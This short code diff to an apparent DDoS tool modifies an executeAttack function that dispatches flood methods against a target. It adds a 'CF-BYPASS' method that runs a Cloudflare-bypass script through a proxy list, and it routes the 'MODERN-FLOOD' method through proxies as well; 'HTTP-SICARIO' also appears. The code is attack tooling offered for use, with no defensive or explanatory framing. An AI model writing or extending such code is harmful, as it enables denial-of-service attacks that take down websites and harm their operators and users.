@@ -191,9 +191,13 @@ function executeAttack(target, time, methods) {
     }, parseInt(time) * 1000 + 5000); // Add 5s buffer
   };
 
-  if (methods === 'MODERN-FLOOD') {
+  if (methods === 'CF-BYPASS') {
+    console.log('✅ Executing CF-BYPASS');
+    execWithLog(`node methods/cf-bypass.js ${target} ${time} 4 32 proxy.txt`);
+  }
+  else if (methods === 'MODERN-FLOOD') {
     console.log('✅ Executing MODERN-FLOOD');
-    execWithLog(`node methods/modern-flood.js ${target} ${time} 4 64`);
+    execWithLog(`node methods/modern-flood.js ${target} ${time} 4 64 proxy.txt`);
   }
   else if (methods === 'HTTP-SICARIO') {
     console.log('✅ Executing HTTP-SICARIO');
